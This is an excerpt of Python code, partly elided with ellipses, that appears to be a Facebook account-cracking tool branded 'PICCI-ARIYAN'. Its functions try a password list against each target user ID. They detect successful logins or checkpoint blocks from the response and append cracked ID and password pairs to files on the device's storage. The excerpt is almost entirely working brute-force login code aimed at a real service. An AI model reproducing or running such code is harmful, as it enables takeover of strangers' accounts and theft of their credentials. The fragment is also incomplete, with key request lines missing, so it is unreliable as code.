...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [PICCI-ARIYAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [PICCI-ARIYAN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/PICCI-ARIYAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Haniya:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [PICCI-ARIYAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PICCI-ARIYAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [PICCI-ARIYAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PICCI-ARIYAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/PICCI-ARIYAN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [PICCI-ARIYAN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/PICCI-ARIYAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [PICCI-ARIYAN-OK] '+uid+' | '+pas+'\033[1;97m')
